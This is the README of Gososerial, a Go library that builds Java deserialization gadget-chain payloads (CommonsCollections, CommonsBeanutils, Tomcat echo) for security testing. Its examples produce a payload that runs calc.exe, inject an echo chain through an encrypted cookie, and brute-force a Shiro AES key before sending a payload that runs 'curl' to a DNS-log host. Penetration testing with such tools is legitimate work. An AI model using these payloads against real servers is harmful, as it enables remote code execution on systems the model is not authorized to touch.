# Gososerial

## 介绍

- 参考著名安全工具xray的代码

- ysoserial是java反序列化安全方面著名的工具

- 从二进制层面解析，无需java环境，无需下载ysoserial.jar
  
- 输入命令直接获得payload，方便编写安全工具

- 目前已支持CC1-CC7，K1-K4和CB1链

- 支持K1和K2的TomcatEcho，HTTP头可自行取名

## Quick Start

- download and import

```shell
go get github.com/EmYiQing/Gososerial
```

- example

```go
package main

import (
	"fmt"
	gososerial "github.com/EmYiQing/Gososerial"
)

func main() {
	var payload []byte
	payload = gososerial.GetCC1("calc.exe")
	fmt.Println(payload)
}
```

- how to use tomcat echo

```go
package main

import (
	gososerial "github.com/EmYiQing/Gososerial"
	"..."
)

func main() {
	// Testecho: expr 10 '*' 10 -> Testecho: expr 10 '*' 10
	// Testcmd: expr 10 '*' 10 -> Testcmd: 100
	payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")

	req.Cookie = AESEncrypt(payload)
	req.Header["Testecho"] = "gososerial"
	req.Method = "POST"
	resp := httputil.sendRequest(req)

	if resp.Header["Testecho"] == "gososerial" {
		log.Info("find cck2 tomcat echo")
	}
}
```

- shiro scan example

```go
package main

import (
	gososerial "github.com/EmYiQing/Gososerial"
	"..."
)

func main() {
	// Shiro Scan Code
	target := "http://shiro_ip/"
	// Brust Shiro AES Key 
	key := shiro.CheckShiroKey(target)
	if key != nil {
		log.Info("find key: %s", key)
	}
	// Use CommonsCollections5 Payload
	var payload []byte
	payload = gososerial.GetCC5("curl xxxxx.ceye.io")
	// Send Cookies Encrypted By AES
	shiro.SendPayload(key, payload, target)
	// Receive Results Using Dnslog API
	if ceye.CheckResult("your_ceye_token") {
		log.Info("find shiro!")
	}
}
```

## 命令行 (beta)

- CommonsCollections1

![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)

- 支持列表

![](https://github.com/EmYiQing/Gososerial/blob/master/img/2.png)

## 感谢

参考xray作者phith0n和koalr师傅的代码

**xray**: https://github.com/chaitin/xray

**phith0n**: https://github.com/phith0n

**ysoserial**: https://github.com/frohoff/ysoserial

**koalr**: https://github.com/zema1/ysoserial

## 免责申明

未经授权许可使用Gososerial攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的
